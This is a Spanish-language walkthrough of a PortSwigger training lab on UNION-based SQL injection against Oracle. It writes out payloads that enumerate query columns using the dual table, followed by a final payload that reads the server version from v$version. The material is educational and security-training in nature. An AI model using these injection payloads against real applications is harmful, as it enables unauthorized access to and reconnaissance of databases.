# SQL Injection Attack - Querying Database Version on Oracle

## 📌 Lab Information

- **Lab:** Querying the Database Type and Version on Oracle
- **Categoría:** SQL Injection UNION Attack
- **Motor BD:** Oracle

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

---

## 🎯 Objetivo

Obtener la versión de la base de datos Oracle utilizando SQL Injection UNION-based.

---

## 🔍 Identificación de columnas

Oracle requiere utilizar la tabla `dual` para consultas que no referencian tablas reales.

Comenzamos enumerando columnas:

```sql
' union select 'abc' from dual --
```

Resultado:

![Error una columna](../Imagenes/pasted-image-20260329200148.png)

---

Agregamos otra columna:

```sql
' union select 'abc', 'def' from dual --
```

Resultado exitoso:

![Dos columnas válidas](../Imagenes/pasted-image-20260329200307.png)

---

Probamos una tercera columna:

```sql
' union select 'abc', 'def', 'qwe' from dual --
```

Resultado:

![Error tercera columna](../Imagenes/pasted-image-20260329200508.png)

---

## 🧠 Conclusión

La consulta vulnerable contiene exactamente **2 columnas**.

---

## 🚀 Obtención de versión Oracle

Investigando la documentación Oracle observamos que la vista `v$version` contiene la columna `BANNER`.

Payload final:

```sql
' union select BANNER, null from v$version --
```

Resultado:

![Versión Oracle](../Imagenes/pasted-image-20260329201237.png)

---

## ✅ Resultado

Se logró obtener exitosamente:
- Tipo de motor Oracle
- Versión exacta del servidor
